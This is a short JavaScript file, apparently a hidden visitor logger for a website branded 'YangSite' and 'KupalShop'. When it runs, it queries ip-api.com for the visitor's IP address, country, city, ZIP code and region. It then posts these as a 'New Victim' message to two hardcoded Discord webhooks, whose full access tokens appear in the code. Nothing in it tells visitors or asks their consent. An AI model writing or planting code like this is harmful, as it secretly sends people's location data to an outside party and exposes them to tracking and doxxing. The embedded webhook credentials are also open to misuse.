const webhooks = [
  { name: "Primary Webhook", url: "https://canary.discord.com/api/webhooks/1324034958272106549/9tAUPlC-SfJDlUaOVvatM14z-yrJx7vIF6IhJUA6Y0nz3i-DsAj-qmha1cmJzieTq1HU" },
  { name: "Secondary Webhook", url: "https://canary.discord.com/api/webhooks/1324321667748724797/dmmd2E82Nz2s_piRFiy_IGep-jj5O8pwsw5ZmeC6-CfvSZIk-i7LrB4l6Aw3Zpe7sXD_" }
  
];

async function IP_Info() {
  /**
   * Fetches IP information of the user
   * @return {fetch.Body.json()} Response Body
   */
  let response = await fetch("http://ip-api.com/json", {
    method: "GET",
    headers: {
      "cache-control": "no-cache",
      "content-type": "application/json",
    },
  });
  return response.json();
}

IP_Info()
  .then((value) => {
    let requiredInfo = ["status", "country", "city", "zip", "regionName"];
    let noData = false;

    // Ensure the required fields are present
    for (let i = 0; i < requiredInfo.length; i++) {
      if (typeof value[`${requiredInfo[i]}`] === "undefined") {
        noData = true;
        break;
      }
    }

    if (noData) {
      return null;
    }
    return value;
  })
  .then(async (value) => {
    if (value !== null) {
      const payload = {
        username: "YangSite Logger",  // Webhook name
        avatar_url: "https://cdn.discordapp.com/attachments/1324034214131142821/1324036697343918110/g9vvmvHclWomQAAAABJRU5ErkJggg.png?ex=6776b0c4&is=67755f44&hm=1219ab2aa8f6178d04c0e6812a828ad1f5b7d855099fc3cd352fad1052f0d40a&",  // Webhook avatar URL
        content: "``New Victim``",
        embeds: [
          {
            title: "Victim IP",
            type: "rich",
            color: 0x000000,  // Black color in hexadecimal
            description: "***IP information of the recent website visitor***",
            fields: [
              { name: "IP", value: `${value.query}`, inline: false },
              { name: "Country", value: `${value.country}`, inline: false },
              { name: "City", value: `${value.city}`, inline: false },
              { name: "ZIP", value: `${value.zip}`, inline: false },
              { name: "Region", value: `${value.regionName}`, inline: false },
            ],
            footer: {
              text: "Yang",
              icon_url:
                "https://media.discordapp.net/attachments/1324034214131142821/1324036697343918110/g9vvmvHclWomQAAAABJRU5ErkJggg.png?ex=6776b0c4&is=67755f44&hm=1219ab2aa8f6178d04c0e6812a828ad1f5b7d855099fc3cd352fad1052f0d40a&=&format=webp&quality=lossless&width=521&height=521",
            },
            author: {
              name: "KupalShop",
              url: "https://discord.gg/kupal",
              icon_url: "https://cdn.discordapp.com/attachments/1324034214131142821/1324036697343918110/g9vvmvHclWomQAAAABJRU5ErkJggg.png?ex=6776b0c4&is=67755f44&hm=1219ab2aa8f6178d04c0e6812a828ad1f5b7d855099fc3cd352fad1052f0d40a&",  // Your avatar URL
            },
            thumbnail: {
              url: "https://cdn.discordapp.com/attachments/1311370090117201990/1324038935952752710/kk9.gif?ex=6776b2d9&is=67756159&hm=e12a730fe3b8984394190fba06a47ea8651d1407e522f45044767444a3a430ca&",
            },
          },
        ],
      };

      // Send the payload to each webhook
      for (const webhook of webhooks) {
        try {
          const response = await fetch(webhook.url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
          });

          if (response.ok) {
            console.log(`Payload sent to ${webhook.name}`);
          } else {
            console.log(`Failed to send to ${webhook.name}:`, response.statusText);
          }
        } catch (err) {
          console.log(`Error sending to ${webhook.name}:`, err);
        }
      }
    }
  })
  .catch((err) => {
    console.log("Request failed:", err);
  });
